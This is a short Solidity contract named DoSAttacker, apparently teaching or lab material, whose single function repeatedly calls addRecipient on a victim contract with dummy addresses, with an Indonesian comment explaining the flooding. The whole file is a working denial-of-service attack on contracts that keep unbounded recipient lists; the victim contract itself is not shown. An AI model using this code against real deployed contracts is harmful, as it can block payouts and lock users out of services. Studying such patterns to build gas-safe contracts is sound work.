// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IDoSVictim {
    function addRecipient(address _addr) external;
}

contract DoSAttacker {
    IDoSVictim public victim;

    constructor(address _victim) {
        victim = IDoSVictim(_victim);
    }

    function floodVictim(uint count) public {
        for (uint i = 0; i < count; i++) {
            // Tambahkan banyak recipient dummy ke victim
            victim.addRecipient(address(uint160(i + 1000)));
        }
    }
}
